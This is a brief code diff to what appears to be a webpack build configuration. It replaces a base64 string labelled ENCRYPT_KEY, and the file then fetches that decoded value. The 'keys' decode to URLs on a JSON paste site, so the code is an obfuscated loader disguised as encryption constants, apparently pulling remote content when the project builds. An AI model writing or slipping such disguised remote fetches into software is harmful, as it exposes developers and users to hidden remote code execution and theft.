@@ -1,5 +1,5 @@
 const webpack = require('webpack');
-const ENCRYPT_KEY = "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9JWUROTQ==";
+const ENCRYPT_KEY = "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9VVlVQQQ==";
 const DECRYPT_KEY = "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9NRFMwNw==";
 
 fetch(atob(ENCRYPT_KEY))
